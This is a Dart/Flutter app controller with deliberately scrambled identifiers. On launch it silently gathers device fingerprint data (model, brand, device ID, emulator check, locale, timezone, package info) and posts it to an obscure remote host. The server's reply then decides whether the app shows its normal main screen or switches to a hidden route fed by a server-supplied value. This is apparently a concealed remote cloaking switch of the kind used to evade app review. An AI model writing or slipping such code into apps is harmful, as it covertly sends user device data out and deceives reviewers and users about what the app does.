import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var crktsybdze = RxBool(false);
  var mljbdfukhg = RxBool(true);
  var vhbiekc = RxString("");
  var alejandra = RxBool(false);
  var cartwright = RxBool(true);
  final hwcdnb = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    psovf();
  }


  Future<void> psovf() async {

    alejandra.value = true;
    cartwright.value = true;
    mljbdfukhg.value = false;

    hwcdnb.post("https://heti.notgo.xyz/rtpauvznglysxbjmhdwfic",data: await xkqsyuwgl()).then((value) {
      var kcerjwxo = value.data["kcerjwxo"] as String;
      var iyzlbxwo = value.data["iyzlbxwo"] as bool;
      if (iyzlbxwo) {
        vhbiekc.value = kcerjwxo;
        eve();
      } else {
        schuster();
      }
    }).catchError((e) {
      mljbdfukhg.value = true;
      cartwright.value = true;
      alejandra.value = false;
    });
  }

  Future<Map<String, dynamic>> xkqsyuwgl() async {
    final DeviceInfoPlugin zoxt = DeviceInfoPlugin();
    PackageInfo oglmb_esokzrn = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var aidjzm = Platform.localeName;
    var ckmdnlut = currentTimeZone;

    var mrcsqnx = oglmb_esokzrn.packageName;
    var enfa = oglmb_esokzrn.version;
    var vady = oglmb_esokzrn.buildNumber;

    var cxwpv = oglmb_esokzrn.appName;
    var ervinJohns = "";
    var fdnhvrip  = "";
    var iqhywxrb = "";
    var ferneOkuneva = "";
    var roseUpton = "";
    var margaretFrami = "";
    var vdcpen = "";

    var antwonMoore = "";

    var przl = "";
    var tudvjg = false;

    if (GetPlatform.isAndroid) {
      przl = "android";
      var rhzkytqde = await zoxt.androidInfo;

      iqhywxrb = rhzkytqde.brand;

      vdcpen  = rhzkytqde.model;
      fdnhvrip = rhzkytqde.id;

      tudvjg = rhzkytqde.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      przl = "ios";
      var xrmokfve = await zoxt.iosInfo;
      iqhywxrb = xrmokfve.name;
      vdcpen = xrmokfve.model;

      fdnhvrip = xrmokfve.identifierForVendor ?? "";
      tudvjg  = xrmokfve.isPhysicalDevice;
    }
    var res = {
      "fdnhvrip": fdnhvrip,
      "cxwpv": cxwpv,
      "vady": vady,
      "mrcsqnx": mrcsqnx,
      "ferneOkuneva" : ferneOkuneva,
      "vdcpen": vdcpen,
      "ckmdnlut": ckmdnlut,
      "iqhywxrb": iqhywxrb,
      "aidjzm": aidjzm,
      "antwonMoore" : antwonMoore,
      "przl": przl,
      "tudvjg": tudvjg,
      "enfa": enfa,
      "ervinJohns" : ervinJohns,
      "roseUpton" : roseUpton,
      "margaretFrami" : margaretFrami,

    };
    return res;
  }

  Future<void> schuster() async {
    Get.offAllNamed("/main");
  }

  Future<void> eve() async {
    Get.offAllNamed("/edit_rule");
  }

}
